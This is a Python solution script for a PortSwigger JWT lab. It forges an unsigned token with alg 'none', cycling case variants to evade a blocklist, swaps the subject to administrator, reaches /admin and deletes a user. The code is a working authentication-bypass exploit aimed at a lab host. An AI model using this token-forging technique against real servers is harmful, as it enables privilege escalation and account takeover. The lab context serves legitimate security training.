"""
Lab 2: JWT authentication bypass via flawed signature verification
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
Difficulty: Apprentice

📝 The flaw: the server accepts alg: "none" (case variants like "None"/"NONE"
sometimes needed to dodge a blocklist) as a legitimate, unsigned token.

Goal: become admin, delete user carlos via /admin.
"""

from utils import get_session, log, note, decode_jwt, b64url_encode
import json

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()

    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    header, payload = decode_jwt(token)
    note(f"Original header: {header}")

    payload["sub"] = "administrator"

    for alg_variant in ["none", "None", "NONE", "nOnE"]:
        header["alg"] = alg_variant
        h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        forged = f"{h}.{p}."  # trailing dot, empty signature segment

        s.cookies.set("session", forged)
        r = s.get(f"{TARGET}/admin")
        log(f"alg={alg_variant!r} -> /admin status {r.status_code}")
        if r.status_code == 200:
            note(f"Server accepted alg variant '{alg_variant}' as unsigned.")
            break
    else:
        log("None of the alg:none variants worked — check blocklist specifics.", ok=False)
        return

    r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
    log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
